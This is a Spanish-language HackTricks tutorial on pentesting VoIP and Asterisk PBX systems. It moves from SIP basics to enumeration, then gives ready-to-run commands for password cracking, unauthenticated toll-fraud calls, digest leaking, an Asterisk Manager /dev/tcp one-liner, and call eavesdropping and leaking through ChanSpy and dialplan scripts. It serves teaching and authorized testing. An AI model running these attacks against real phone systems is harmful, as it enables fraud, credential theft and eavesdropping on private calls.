# Pentesting VoIP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## VoIP Informaci√≥n B√°sica

Para comenzar a aprender sobre c√≥mo funciona VoIP, consulta:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Mensajes B√°sicos
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## C√≥digos de Respuesta

**1xx‚ÄîRespuestas Provisionales**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx‚ÄîRespuestas Exitosas**
```
200 OK
202 Accepted
204 No Notification
```
**3xx‚ÄîRespuestas de Redirecci√≥n**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx‚ÄîRespuestas de Fallo del Cliente**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx‚ÄîRespuestas de Fallo del Servidor**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx‚ÄîRespuestas de Fallo Global**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### N√∫meros de Tel√©fono

Uno de los primeros pasos que podr√≠a dar un Red Team es buscar n√∫meros de tel√©fono disponibles para contactar con la empresa utilizando herramientas OSINT, b√∫squedas en Google o raspando las p√°ginas web.

Una vez que tengas los n√∫meros de tel√©fono, podr√≠as usar servicios en l√≠nea para identificar al operador:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Saber si el operador proporciona servicios de VoIP podr√≠a ayudarte a identificar si la empresa est√° utilizando VoIP... Adem√°s, es posible que la empresa no haya contratado servicios de VoIP, pero est√© utilizando tarjetas PSTN para conectar su propia PBX VoIP a la red de telefon√≠a tradicional.

Cosas como respuestas autom√°ticas de m√∫sica suelen indicar que se est√° utilizando VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informaci√≥n OSINT

Cualquier otra enumeraci√≥n OSINT que ayude a identificar el software VoIP que se est√° utilizando ser√° √∫til para un Red Team.

### Enumeraci√≥n de Red

* **`nmap`** es capaz de escanear servicios UDP, pero debido a la cantidad de servicios UDP que se escanean, es muy lento y puede no ser muy preciso con este tipo de servicios.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** de SIPVicious (`sudo apt install sipvicious`): Localizar√° servicios SIP en la red indicada.
* `svmap` es **f√°cil de bloquear** porque utiliza el User-Agent `friendly-scanner`, pero podr√≠as modificar el c√≥digo de `/usr/share/sipvicious/sipvicious` y cambiarlo.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** from [**sippts**](https://github.com/Pepelux/sippts)**:** El esc√°ner SIPPTS es un esc√°ner muy r√°pido para servicios SIP a trav√©s de UDP, TCP o TLS. Utiliza multihilo y puede escanear grandes rangos de redes. Permite indicar f√°cilmente un rango de puertos, escanear tanto TCP como UDP, usar otro m√©todo (por defecto usar√° OPTIONS) y especificar un User-Agent diferente (y m√°s).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Enumeraci√≥n de Red Extra

El PBX tambi√©n podr√≠a estar exponiendo otros servicios de red como:

* **69/UDP (TFTP)**: Actualizaciones de firmware
* **80 (HTTP) / 443 (HTTPS)**: Para gestionar el dispositivo desde la web
* **389 (LDAP)**: Alternativa para almacenar la informaci√≥n de los usuarios
* **3306 (MySQL)**: Base de datos MySQL
* **5038 (Manager)**: Permite usar Asterisk desde otras plataformas
* **5222 (XMPP)**: Mensajes usando Jabber
* **5432 (PostgreSQL)**: Base de datos PostgreSQL
* Y otros...

### Enumeraci√≥n de M√©todos

Es posible encontrar **qu√© m√©todos est√°n disponibles** para usar en el PBX utilizando `SIPPTS enumerate` de [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Analizando las respuestas del servidor

Es muy importante analizar los encabezados que un servidor nos env√≠a, dependiendo del tipo de mensaje y encabezados que enviamos. Con `SIPPTS send` de [**sippts**](https://github.com/Pepelux/sippts) podemos enviar mensajes personalizados, manipulando todos los encabezados, y analizar la respuesta.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Tambi√©n es posible obtener datos si el servidor utiliza websockets. Con `SIPPTS wssend` de [**sippts**](https://github.com/Pepelux/sippts) podemos enviar mensajes WS personalizados.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Enumeraci√≥n de Extensiones

Las extensiones en un sistema PBX (Centralita Privada) se refieren a los **identificadores internos √∫nicos asignados a l√≠neas** telef√≥nicas, dispositivos o usuarios dentro de una organizaci√≥n o negocio. Las extensiones hacen posible **rutar llamadas dentro de la organizaci√≥n de manera eficiente**, sin la necesidad de n√∫meros de tel√©fono externos individuales para cada usuario o dispositivo.

* **`svwar`** de SIPVicious (`sudo apt install sipvicious`): `svwar` es un esc√°ner de l√≠neas de extensi√≥n SIP PBX gratuito. En concepto, funciona de manera similar a los marcadores tradicionales al **adivinar un rango de extensiones o una lista dada de extensiones**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identifica extensiones en un servidor SIP. Sipexten puede verificar grandes rangos de red y puertos.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Tambi√©n puedes enumerar extensiones/nombres de usuario con metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** es un enumerador de **fuerza bruta de nombres de usuario** del protocolo Inter Asterisk Exchange. enumIAX puede operar en dos modos distintos: Adivinanza Secuencial de Nombres de Usuario o Ataque de Diccionario.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Ataques VoIP

### Fuerza Bruta de Contrase√±a - en l√≠nea

Habiendo descubierto el **PBX** y algunos **n√∫meros de extensi√≥n/nombres de usuario**, un Red Team podr√≠a intentar **autenticarse a trav√©s del m√©todo `REGISTER`** a una extensi√≥n utilizando un diccionario de contrase√±as comunes para realizar un ataque de fuerza bruta a la autenticaci√≥n.

{% hint style="danger" %}
Tenga en cuenta que un **nombre de usuario** puede ser el mismo que la extensi√≥n, pero esta pr√°ctica puede variar seg√∫n el sistema PBX, su configuraci√≥n y las preferencias de la organizaci√≥n...

Si el nombre de usuario no es el mismo que la extensi√≥n, necesitar√° **descubrir el nombre de usuario para realizar el ataque de fuerza bruta**.
{% endhint %}

* **`svcrack`** de SIPVicious (`sudo apt install sipvicious`): SVCrack le permite descifrar la contrase√±a para un nombre de usuario/extensi√≥n espec√≠fico en un PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack es un cracker de contrase√±as remoto para servicios SIP. Rcrack puede probar contrase√±as para varios usuarios en diferentes IPs y rangos de puertos.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Sniffing de VoIP

Si encuentras equipos de VoIP dentro de una **red Wifi abierta**, podr√≠as **capturar toda la informaci√≥n**. Adem√°s, si est√°s dentro de una red m√°s cerrada (conectada por Ethernet o Wifi protegido) podr√≠as realizar **ataques MitM como** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) entre la **PBX y la puerta de enlace** para poder capturar la informaci√≥n.

Entre la informaci√≥n de la red, podr√≠as encontrar **credenciales web** para gestionar el equipo, **extensiones** de usuario, **nombre de usuario**, direcciones **IP**, incluso **contrase√±as hash** y **paquetes RTP** que podr√≠as reproducir para **escuchar la conversaci√≥n**, y m√°s.

Para obtener esta informaci√≥n podr√≠as usar herramientas como Wireshark, tcpdump... pero una **herramienta especialmente creada para capturar conversaciones de VoIP es** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Ten en cuenta que si **se utiliza TLS en la comunicaci√≥n SIP** no podr√°s ver la comunicaci√≥n SIP en claro.\
Lo mismo suceder√° si se utiliza **SRTP** y **ZRTP**, **los paquetes RTP no estar√°n en texto claro**.
{% endhint %}

#### Credenciales SIP (Fuerza Bruta de Contrase√±a - offline)

[Consulta este ejemplo para entender mejor una **comunicaci√≥n SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) para aprender c√≥mo se est√°n **enviando las credenciales**.

* **`sipdump`** y **`sipcrack`,** parte de **sipcrack** (`apt-get install sipcrack`): Estas herramientas pueden **extraer** de un **pcap** las **autenticaciones digest** dentro del protocolo SIP y **realizar fuerza bruta** sobre ellas.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump puede extraer autenticaciones digest de un archivo pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack es una herramienta para descifrar las autenticaciones digest obtenidas con el volcado de SIPPTS.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark extrae datos del protocolo SIP de un archivo PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### C√≥digos DTMF

**No solo se pueden encontrar credenciales SIP** en el tr√°fico de red, tambi√©n es posible encontrar c√≥digos DTMF que se utilizan, por ejemplo, para acceder al **correo de voz**.\
Es posible enviar estos c√≥digos en **mensajes SIP INFO**, en **audio** o dentro de **paquetes RTP**. Si los c√≥digos est√°n dentro de paquetes RTP, podr√≠as cortar esa parte de la conversaci√≥n y usar la herramienta multimo para extraerlos:
```bash
multimon -a DTMF -t wac pin.wav
```
### Llamadas Gratuitas / Configuraciones Incorrectas de Conexiones Asterisks

En Asterisk es posible permitir una conexi√≥n **desde una direcci√≥n IP espec√≠fica** o desde **cualquier direcci√≥n IP**:
```
host=10.10.10.10
host=dynamic
```
Si se especifica una direcci√≥n IP, el host **no necesitar√° enviar solicitudes REGISTER** de vez en cuando (en el paquete REGISTER se env√≠a el tiempo de vida, generalmente 30 minutos, lo que significa que en otro escenario el tel√©fono necesitar√° REGISTER cada 30 minutos). Sin embargo, necesitar√° tener puertos abiertos que permitan conexiones desde el servidor VoIP para recibir llamadas.

Para definir usuarios, se pueden definir como:

* **`type=user`**: El usuario solo puede recibir llamadas como usuario.
* **`type=friend`**: Es posible realizar llamadas como par y recibirlas como usuario (utilizado con extensiones).
* **`type=peer`**: Es posible enviar y recibir llamadas como par (SIP-trunks).

Tambi√©n es posible establecer confianza con la variable insegura:

* **`insecure=port`**: Permite conexiones de pares validadas por IP.
* **`insecure=invite`**: No requiere autenticaci√≥n para mensajes INVITE.
* **`insecure=port,invite`**: Ambos.

{% hint style="warning" %}
Cuando se utiliza **`type=friend`**, el **valor** de la variable **host** **no ser√° utilizado**, por lo que si un administrador **configura incorrectamente un SIP-trunk** utilizando ese valor, **cualquiera podr√° conectarse a √©l**.

Por ejemplo, esta configuraci√≥n ser√≠a vulnerable:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Llamadas Gratis / Configuraciones Incorrectas de Contexto en Asterisco

En Asterisk, un **contexto** es un contenedor o secci√≥n nombrada en el plan de marcado que **agrupa extensiones, acciones y reglas relacionadas**. El plan de marcado es el componente central de un sistema Asterisk, ya que define **c√≥mo se manejan y enrutan las llamadas entrantes y salientes**. Los contextos se utilizan para organizar el plan de marcado, gestionar el control de acceso y proporcionar separaci√≥n entre diferentes partes del sistema.

Cada contexto se define en el archivo de configuraci√≥n, t√≠picamente en el archivo **`extensions.conf`**. Los contextos se denotan por corchetes cuadrados, con el nombre del contexto encerrado dentro de ellos. Por ejemplo:
```bash
csharpCopy code[my_context]
```
Dentro del contexto, defines extensiones (patrones de n√∫meros marcados) y las asocias con una serie de acciones o aplicaciones. Estas acciones determinan c√≥mo se procesa la llamada. Por ejemplo:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Este ejemplo demuestra un contexto simple llamado "my\_context" con una extensi√≥n "100". Cuando alguien marca 100, la llamada ser√° contestada, se reproducir√° un mensaje de bienvenida y luego la llamada ser√° terminada.

Este es **otro contexto** que permite **llamar a cualquier otro n√∫mero**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Si el administrador define el **contexto predeterminado** como:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Cualquiera podr√° usar el **servidor para llamar a cualquier otro n√∫mero** (y el administrador del servidor pagar√° por la llamada).
{% endhint %}

{% hint style="danger" %}
Adem√°s, por defecto el archivo **`sip.conf`** contiene **`allowguest=true`**, entonces **cualquier** atacante sin **autenticaci√≥n** podr√° llamar a cualquier otro n√∫mero.
{% endhint %}

*   **`SIPPTS invite`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite verifica si un **servidor PBX nos permite hacer llamadas sin autenticaci√≥n**. Si el servidor SIP tiene una configuraci√≥n incorrecta, nos permitir√° hacer llamadas a n√∫meros externos. Tambi√©n puede permitirnos transferir la llamada a un segundo n√∫mero externo.

Por ejemplo, si tu servidor Asterisk tiene una mala configuraci√≥n de contexto, puede aceptar solicitudes INVITE sin autorizaci√≥n. En este caso, un atacante puede hacer llamadas sin conocer ning√∫n usuario/contrase√±a.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Llamadas gratuitas / IVRS mal configurados

IVRS significa **Sistema de Respuesta de Voz Interactiva**, una tecnolog√≠a de telefon√≠a que permite a los usuarios interactuar con un sistema computarizado a trav√©s de entradas de voz o tonos de marcaci√≥n. IVRS se utiliza para construir sistemas de **manejo de llamadas automatizado** que ofrecen una variedad de funcionalidades, como proporcionar informaci√≥n, enrutar llamadas y capturar la entrada del usuario.

IVRS en sistemas VoIP t√≠picamente consiste en:

1. **Indicaciones de voz**: Mensajes de audio pregrabados que gu√≠an a los usuarios a trav√©s de las opciones del men√∫ IVR e instrucciones.
2. **DTMF** (Dual-Tone Multi-Frequency) se√±alizaci√≥n: Entradas de tonos de marcaci√≥n generadas al presionar teclas en el tel√©fono, que se utilizan para navegar a trav√©s de los men√∫s IVR y proporcionar entrada.
3. **Enrutamiento de llamadas**: Dirigir llamadas al destino apropiado, como departamentos espec√≠ficos, agentes o extensiones seg√∫n la entrada del usuario.
4. **Captura de entrada del usuario**: Recopilar informaci√≥n de los llamantes, como n√∫meros de cuenta, IDs de caso o cualquier otro dato relevante.
5. **Integraci√≥n con sistemas externos**: Conectar el sistema IVR a bases de datos u otros sistemas de software para acceder o actualizar informaci√≥n, realizar acciones o activar eventos.

En un sistema VoIP Asterisk, puedes crear un IVR utilizando el plan de marcado (**`extensions.conf`** archivo) y varias aplicaciones como `Background()`, `Playback()`, `Read()`, y m√°s. Estas aplicaciones te ayudan a reproducir indicaciones de voz, capturar la entrada del usuario y controlar el flujo de la llamada.

#### Ejemplo de configuraci√≥n vulnerable
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
El anterior es un ejemplo donde se le pide al usuario que **presione 1 para llamar** a un departamento, **2 para llamar** a otro, o **el n√∫mero completo** si lo conoce.\
La vulnerabilidad es el hecho de que la **longitud de la extensi√≥n indicada no se verifica, por lo que un usuario podr√≠a ingresar el n√∫mero completo con un tiempo de espera de 5 segundos y se llamar√°.**

### Inyecci√≥n de Extensi√≥n

Usando una extensi√≥n como:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Donde **`${EXTEN}`** es la **extensi√≥n** que ser√° llamada, cuando se **introduzca la ext 101** esto es lo que suceder√°:
```scss
exten => 101,1,Dial(SIP/101)
```
Sin embargo, si **`${EXTEN}`** permite introducir **m√°s que n√∫meros** (como en versiones anteriores de Asterisk), un atacante podr√≠a introducir **`101&SIP123123123`** para llamar al n√∫mero de tel√©fono 123123123. Y este ser√≠a el resultado:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Por lo tanto, una llamada a la extensi√≥n **`101`** y **`123123123`** ser√° enviada y solo la primera que reciba la llamada ser√° establecida... pero si un atacante utiliza una **extensi√≥n que elude cualquier coincidencia** que se est√© realizando pero no existe, podr√≠a **inyectar una llamada solo al n√∫mero deseado**.

## Vulnerabilidad SIPDigestLeak

La vulnerabilidad SIP Digest Leak es una vulnerabilidad que afecta a un gran n√∫mero de tel√©fonos SIP, incluidos tanto tel√©fonos IP de hardware como de software, as√≠ como adaptadores de tel√©fono (VoIP a anal√≥gico). La vulnerabilidad permite **la filtraci√≥n de la respuesta de autenticaci√≥n Digest**, que se calcula a partir de la contrase√±a. Un **ataque de contrase√±a offline es entonces posible** y puede recuperar la mayor√≠a de las contrase√±as basadas en la respuesta del desaf√≠o.

**[Escenario de vulnerabilidad desde aqu√≠**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Un tel√©fono IP (v√≠ctima) est√° escuchando en cualquier puerto (por ejemplo: 5060), aceptando llamadas telef√≥nicas
2. El atacante env√≠a un INVITE al tel√©fono IP
3. El tel√©fono de la v√≠ctima comienza a sonar y alguien contesta y cuelga (porque nadie responde el tel√©fono al otro lado)
4. Cuando se cuelga el tel√©fono, el **tel√©fono de la v√≠ctima env√≠a un BYE al atacante**
5. El **atacante emite una respuesta 407** que **pide autenticaci√≥n** y emite un desaf√≠o de autenticaci√≥n
6. El **tel√©fono de la v√≠ctima proporciona una respuesta al desaf√≠o de autenticaci√≥n** en un segundo BYE
7. El **atacante puede entonces realizar un ataque de fuerza bruta** en la respuesta del desaf√≠o en su m√°quina local (o red distribuida, etc.) y adivinar la contrase√±a

* **Filtraci√≥n SIPPTS** de [**sippts**](https://github.com/Pepelux/sippts)**:** La filtraci√≥n SIPPTS explota la vulnerabilidad SIP Digest Leak que afecta a un gran n√∫mero de tel√©fonos SIP. La salida se puede guardar en formato SipCrack para realizar un ataque de fuerza bruta utilizando SIPPTS dcrack o la herramienta SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call permite a un **usuario web** (que por ejemplo podr√≠a estar interesado en un producto) **introducir** su **n√∫mero de tel√©fono** para ser llamado. Luego, se llamar√° a un comercial, y cuando √©l **conteste el tel√©fono**, el usuario ser√° **llamado y conectado con el agente**.

Un perfil com√∫n de Asterisk para esto es:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* El perfil anterior permite que **CUALQUIER direcci√≥n IP se conecte** (si se conoce la contrase√±a).
* Para **organizar una llamada**, como se especific√≥ anteriormente, **no se necesitan permisos de lectura** y **solo** se necesita **originar** en **escritura**.

Con esos permisos, cualquier IP que conozca la contrase√±a podr√≠a conectarse y extraer demasiada informaci√≥n, como:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Se podr√≠a solicitar m√°s informaci√≥n o acciones.**

### **Escucha clandestina**

En Asterisk es posible usar el comando **`ChanSpy`** indicando la(s) **extensi√≥n(es) a monitorear** (o todas ellas) para escuchar las conversaciones que est√°n ocurriendo. Este comando debe ser asignado a una extensi√≥n.

Por ejemplo, **`exten => 333,1,ChanSpy('all',qb)`** indica que si **llamas** a la **extensi√≥n 333**, se **monitorear√°n** **`todas`** las extensiones, **comenzando a escuchar** cada vez que inicie una nueva conversaci√≥n (**`b`**) en modo silencioso (**`q`**) ya que no queremos interactuar en ella. Puedes pasar de una conversaci√≥n a otra presionando **`*`**, o marcando el n√∫mero de extensi√≥n.

Tambi√©n es posible usar **`ExtenSpy`** para monitorear solo una extensi√≥n.

En lugar de escuchar las conversaciones, es posible **grabarlas en archivos** usando una extensi√≥n como: 

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Las llamadas se guardar√°n en **`/tmp`**.

Tambi√©n podr√≠as hacer que Asterisk **ejecute un script que filtrar√° la llamada** cuando se cierre.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Vulnerabilidad RTCPBleed

**RTCPBleed** es un problema de seguridad importante que afecta a los servidores VoIP basados en Asterisk (publicado en 2017). La vulnerabilidad permite que el **tr√°fico RTP (Protocolo de Tiempo Real)**, que transporta conversaciones VoIP, sea **interceptado y redirigido por cualquier persona en Internet**. Esto ocurre porque el tr√°fico RTP elude la autenticaci√≥n al navegar a trav√©s de firewalls NAT (Traducci√≥n de Direcciones de Red).

Los proxies RTP intentan abordar las **limitaciones de NAT** que afectan a los sistemas RTC al hacer proxy de flujos RTP entre dos o m√°s partes. Cuando hay NAT en su lugar, el software del proxy RTP a menudo no puede confiar en la informaci√≥n de IP y puerto RTP recuperada a trav√©s de la se√±alizaci√≥n (por ejemplo, SIP). Por lo tanto, varios proxies RTP han implementado un mecanismo donde tal **tupla de IP y puerto se aprende autom√°ticamente**. Esto se hace a menudo inspeccionando el tr√°fico RTP entrante y marcando la IP y el puerto de origen para cualquier tr√°fico RTP entrante como el que debe ser respondido. Este mecanismo, que puede llamarse "modo de aprendizaje", **no utiliza ning√∫n tipo de autenticaci√≥n**. Por lo tanto, **los atacantes** pueden **enviar tr√°fico RTP al proxy RTP** y recibir el tr√°fico RTP proxy que est√° destinado al llamante o al receptor de un flujo RTP en curso. Llamamos a esta vulnerabilidad RTP Bleed porque permite a los atacantes recibir flujos de medios RTP destinados a ser enviados a usuarios leg√≠timos.

Otro comportamiento interesante de los proxies RTP y las pilas RTP es que a veces, **incluso si no son vulnerables a RTP Bleed**, **aceptar√°n, reenviar√°n y/o procesar√°n paquetes RTP de cualquier fuente**. Por lo tanto, los atacantes pueden enviar paquetes RTP que pueden permitirles inyectar su medio en lugar del leg√≠timo. Llamamos a este ataque inyecci√≥n RTP porque permite la inyecci√≥n de paquetes RTP ileg√≠timos en flujos RTP existentes. Esta vulnerabilidad puede encontrarse tanto en proxies RTP como en puntos finales.

Asterisk y FreePBX han utilizado tradicionalmente la **configuraci√≥n `NAT=yes`**, que permite que el tr√°fico RTP eluda la autenticaci√≥n, lo que puede llevar a que no haya audio o a audio unidireccional en las llamadas.

Para m√°s informaci√≥n, consulta [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed detecta la vulnerabilidad RTP Bleed enviando flujos RTP.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed detecta la vulnerabilidad RTP Bleed enviando flujos RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
